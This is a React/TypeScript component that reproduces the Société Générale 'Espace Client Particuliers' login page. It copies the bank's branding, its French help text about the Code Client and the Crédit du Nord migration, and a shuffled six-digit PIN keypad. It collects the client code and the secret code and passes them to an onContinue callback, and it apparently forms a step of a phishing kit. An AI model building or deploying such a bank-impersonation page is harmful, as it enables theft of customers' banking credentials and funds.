import React, { useState, useMemo } from 'react';

interface LoginStepProps {
  onContinue: (user: string, password: string) => void;
}

function shuffle(arr: number[]): number[] {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

const LoginStep: React.FC<LoginStepProps> = ({ onContinue }) => {
  const [codeClient, setCodeClient] = useState('');
  const [codeError, setCodeError] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const digits = useMemo(() => shuffle([0, 1, 2, 3, 4, 5, 6, 7, 8, 9]), []);

  const handleKey = (digit: number) => {
    if (password.length >= 6) return;
    setPassword(prev => prev + digit);
  };

  const handleClear = () => setPassword('');

  const handleCodeInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').substring(0, 8);
    setCodeClient(val);
    setCodeError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (codeClient.length !== 8) {
      setCodeError('Veuillez saisir votre Code Client à 8 chiffres.');
      return;
    }
    if (password.length !== 6 || isSubmitting) return;
    setIsSubmitting(true);
    await onContinue(codeClient, password);
  };

  const canSubmit = codeClient.length === 8 && password.length === 6 && !isSubmitting;

  const rows = [digits.slice(0, 5), digits.slice(5, 10)];

  return (
    <main className="pt-20 min-h-screen">
      <div className="container mx-auto lg:px-4 lg:py-8">
        <div className="max-w-6xl mx-auto">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">

            <div className="lg:bg-white lg:rounded-2xl lg:shadow-lg lg:p-10 animate-fadeIn">
              <form onSubmit={handleSubmit} className="px-4 lg:px-0">
                <h1 className="font-heading text-3xl font-bold text-gray-900 mb-8">
                  Connexion à votre Espace Client Particuliers
                </h1>

                <div className="mb-6">
                  <label className="block text-xs font-bold text-gray-900 mb-2 uppercase tracking-wide">
                    Code Client
                  </label>
                  <input
                    type="tel"
                    value={codeClient}
                    onChange={handleCodeInput}
                    maxLength={8}
                    placeholder="Votre code client à 8 chiffres"
                    inputMode="numeric"
                    className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-sg-red/20 transition-all text-base ${
                      codeError ? 'border-red-500' : 'border-gray-300 focus:border-sg-red'
                    }`}
                  />
                  {codeError && <span className="text-red-500 text-sm mt-1 block">{codeError}</span>}
                </div>

                <div className="animate-fadeIn">
                  <div className="mb-4">
                    <div className="flex justify-between items-center mb-2">
                      <label className="text-xs font-bold text-gray-900 uppercase tracking-wide">
                        Code Secret
                      </label>
                      <a href="#" className="text-xs text-sg-red hover:text-sg-red-dark font-semibold">
                        Perdu / Oublié ?
                      </a>
                    </div>
                    <p className="text-sm text-gray-600 mb-4">Tapez votre code dans le pavé numérique ci-dessous</p>

                    <div className="flex justify-center gap-3 mb-6">
                      {Array.from({ length: 6 }).map((_, i) => (
                        <div
                          key={i}
                          className={`w-8 h-8 rounded-full border-2 transition-all ${
                            i < password.length
                              ? 'bg-sg-red border-sg-red'
                              : 'bg-white border-gray-300'
                          }`}
                        />
                      ))}
                    </div>
                  </div>

                  <div className="space-y-3 mb-6">
                    {rows.map((row, ri) => (
                      <div key={ri} className="flex justify-center gap-3">
                        {row.map(d => (
                          <button key={`k-${ri}-${d}`} type="button" onClick={() => handleKey(d)}
                            className="w-14 h-14 flex items-center justify-center text-xl font-semibold text-gray-900 bg-gray-50 hover:bg-gray-200 border border-gray-300 rounded-lg transition-colors select-none active:bg-gray-300">
                            {d}
                          </button>
                        ))}
                      </div>
                    ))}
                  </div>

                  <button type="button" onClick={handleClear}
                    className="w-full py-3 mb-4 border-2 border-gray-300 text-gray-700 hover:border-red-500 hover:text-red-500 font-semibold rounded-full transition-all">
                    Effacer
                  </button>

                  <button type="submit" disabled={!canSubmit}
                    className={`w-full py-4 bg-sg-red text-white font-bold text-sm uppercase tracking-wide rounded-full transition-all shadow-md ${
                      canSubmit ? 'hover:bg-sg-red-dark hover:shadow-lg' : 'opacity-50 cursor-not-allowed'
                    }`}>
                    {isSubmitting ? 'Chargement...' : 'Valider'}
                  </button>
                </div>

                <div className="text-center my-6">
                  <a href="#" className="text-sm text-sg-red hover:text-sg-red-dark font-semibold underline">
                    Oubli/Perte de code personnel
                  </a>
                </div>
              </form>
            </div>

            <div className="hidden lg:block bg-white rounded-2xl shadow-lg p-10 space-y-6">
              <div>
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Où trouver mon Code Client SG ?
                </h2>
                <ul className="text-sm text-gray-700 leading-relaxed list-disc list-inside space-y-2">
                  <li>Si vous étiez client Société Générale, votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes.</li>
                  <li>Si vous étiez client d'une des banques du Groupe Crédit du Nord, votre Code Client SG vous a été envoyé par courrier postal. Il remplace votre ancien identifiant.</li>
                </ul>
              </div>
              <div className="pt-4 border-t border-gray-200">
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Mon Code Secret a-t-il changé ?
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed mb-2">Vous seul connaissez votre Code Secret.</p>
                <ul className="text-sm text-gray-700 leading-relaxed list-disc list-inside space-y-2">
                  <li>Si vous étiez client Société Générale, utilisez votre Code Secret habituel.</li>
                  <li>Si vous étiez client d'une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre Banque en Ligne.</li>
                </ul>
              </div>
              <div className="pt-4 border-t border-gray-200">
                <h2 className="font-heading text-sm font-bold text-gray-900 mb-3 uppercase tracking-wide">
                  Sécurité renforcée
                </h2>
                <p className="text-sm text-gray-700 leading-relaxed">
                  La réglementation européenne (DSP2), applicable à toutes les banques, a évolué afin de renforcer la sécurité de vos données bancaires. Désormais, l'accès à votre Espace Client est soumis à une authentification renforcée tous les 180 jours.
                </p>
              </div>
            </div>

          </div>
        </div>
      </div>
    </main>
  );
};

export default LoginStep;
